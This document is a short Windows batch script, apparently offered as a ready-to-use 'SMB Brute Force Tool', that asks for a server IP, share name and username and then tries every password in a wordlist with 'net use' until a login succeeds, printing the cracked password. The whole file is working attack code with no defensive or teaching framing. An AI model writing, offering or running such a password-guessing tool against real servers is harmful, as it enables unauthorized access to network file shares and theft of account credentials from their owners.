@echo off
title SMB Brute Force Tool by DONWELL DONTECH
color 0a
echo SMB Brute Force Tool by DONWELL DONTECH
echo.

setlocal enabledelayedexpansion

:: User Inputs
set /p ip=Enter the IP address of the server: 
set /p share=Enter the share name: 
set /p user=Enter the username: 

echo.
echo 1. Use default wordlist (wordlist.txt in script directory)
echo 2. Enter path to a custom wordlist file
set /p choice=Choose an option (1 or 2): 

if "%choice%"=="1" (
    set "wordlist=%~dp0wordlist.txt"
) else (
    set /p wordlist=Enter the path to the wordlist file: 
)

if not exist "%wordlist%" (
    echo [ERROR] Wordlist file not found! Please check the path.
    pause
    exit /b
)

:: Attempt to brute force SMB login
echo.
echo [INFO] Starting brute force attack on %ip% with user %user%...
echo.

for /f "tokens=* delims=" %%a in (%wordlist%) do (
    set "pass=%%a"
    call :attempt
)

echo [FAILED] Password not found in wordlist. 
pause
exit /b

:: If password is found, success message
:success
echo.
echo [SUCCESS] Password found: %pass%
echo.
pause
exit /b

:: Function to attempt SMB authentication
:attempt
net use z: \\%ip%\%share% /user:%user% !pass! >nul 2>&1
echo [ATTEMPT] Trying: !pass!

if !errorlevel! EQU 0 (
    goto success
)
goto :eof
